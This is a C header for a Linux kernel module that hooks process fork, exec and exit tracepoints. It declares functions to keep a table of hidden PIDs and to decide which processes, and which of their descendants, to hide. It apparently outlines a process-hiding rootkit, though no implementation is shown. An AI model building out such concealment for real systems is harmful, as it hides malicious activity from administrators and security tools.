#ifndef _LIFECYCLE_H_
#define _LIFECYCLE_H_

#include <linux/types.h>
#include <linux/sched.h>
#include <linux/binfmts.h>
#include <linux/tracepoint.h>
#include "proc_state.h"
#include "utils/excludes/string_filtering.h"

/* ---------------- 生命周期 Hook 接口 ---------------- */
int lifecycle_init(void);      // 模块初始化时注册 tracepoints
void lifecycle_cleanup(void);  // 模块卸载时注销 tracepoints

/* ---------------- Tracepoint 回调（内部也可用） -------- */
void on_fork(void *ignore, struct task_struct *parent, struct task_struct *child);
void on_exec(void *ignore, struct task_struct *task,
             pid_t old_pid, struct linux_binprm *bprm);
void on_exit(void *ignore, struct task_struct *task);

/* ---------------- Hidden PID 表操作 ---------------- */
void add_hidden_pid(pid_t pid);
bool is_hidden_pid(pid_t pid);
void remove_hidden_pid(pid_t pid);
void clear_hidden_pid_table(void);

/* ---------------- 统一隐藏判断 ---------------- */
bool should_hide_process(pid_t pid, const char *cmdline);
bool any_ancestor_hidden(struct task_struct *task);
void mark_hidden_if_needed(struct task_struct *task, struct linux_binprm *bprm);

/* ---------------- Tracepoint 遍历 ---------------- */
void find_tracepoints_cb(struct tracepoint *tp, void *ignore);

#endif /* _LIFECYCLE_H_ */

